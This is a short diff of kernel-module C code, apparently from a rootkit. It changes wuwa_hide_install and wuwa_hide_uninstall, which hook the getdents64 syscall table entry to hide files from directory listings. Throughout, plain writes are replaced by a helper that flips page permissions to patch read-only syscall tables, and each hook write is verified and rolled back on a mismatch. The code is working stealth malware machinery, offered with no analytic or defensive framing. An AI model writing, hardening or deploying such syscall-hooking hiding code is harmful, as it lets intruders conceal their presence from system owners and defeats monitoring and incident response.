@@ -294,18 +294,23 @@ int wuwa_hide_install(void)
             continue;
         hook_tables[installed] = table;
         hook_origs[installed] = (getdents64_fn)orig;
-        WRITE_ONCE(table[__NR_getdents64], (unsigned long)wuwa_getdents64);
+        /* Table pages are read-only at runtime: flip AP via the
+         * table writer (guarded, verified, restored below). */
+        if (wuwa_table_write64((unsigned long)&table[__NR_getdents64],
+                               (unsigned long)wuwa_getdents64))
+            continue;
         installed++;
     }
     smp_wmb();
     /* Verify every write; roll back all on any mismatch. */
     for (i = 0; i < installed; i++) {
-        if (hook_tables[i][__NR_getdents64] !=
-            (unsigned long)wuwa_getdents64) {
+        unsigned long back = 0;
+        if (wuwa_safe_read64(&hook_tables[i][__NR_getdents64], &back) ||
+            back != (unsigned long)wuwa_getdents64) {
             int j;
             for (j = 0; j < installed; j++)
-                WRITE_ONCE(hook_tables[j][__NR_getdents64],
-                           (unsigned long)hook_origs[j]);
+                wuwa_table_write64((unsigned long)&hook_tables[j][__NR_getdents64],
+                                   (unsigned long)hook_origs[j]);
             for (j = 0; j < installed; j++) {
                 hook_tables[j] = NULL;
                 hook_origs[j] = NULL;
@@ -337,12 +342,13 @@ int wuwa_hide_uninstall(void)
         return 0;
     }
     for (i = 0; i < hook_ntables; i++)
-        WRITE_ONCE(hook_tables[i][__NR_getdents64],
-                   (unsigned long)hook_origs[i]);
+        wuwa_table_write64((unsigned long)&hook_tables[i][__NR_getdents64],
+                           (unsigned long)hook_origs[i]);
     smp_wmb();
     for (i = 0; i < hook_ntables; i++) {
-        if (hook_tables[i][__NR_getdents64] !=
-            (unsigned long)hook_origs[i])
+        unsigned long back = 0;
+        if (wuwa_safe_read64(&hook_tables[i][__NR_getdents64], &back) ||
+            back != (unsigned long)hook_origs[i])
             bad = 1;
         hook_tables[i] = NULL;
         hook_origs[i] = NULL;
